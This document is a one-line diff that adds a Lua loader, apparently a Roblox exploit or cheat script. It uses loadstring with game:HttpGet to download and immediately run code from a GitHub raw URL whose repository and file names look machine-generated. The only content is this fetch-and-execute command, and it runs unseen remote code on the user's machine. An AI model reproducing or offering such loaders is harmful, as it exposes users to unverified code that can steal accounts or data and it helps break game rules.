@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/gladiator-life-spam7-2x4ez9p4o4lu08.lua"))()
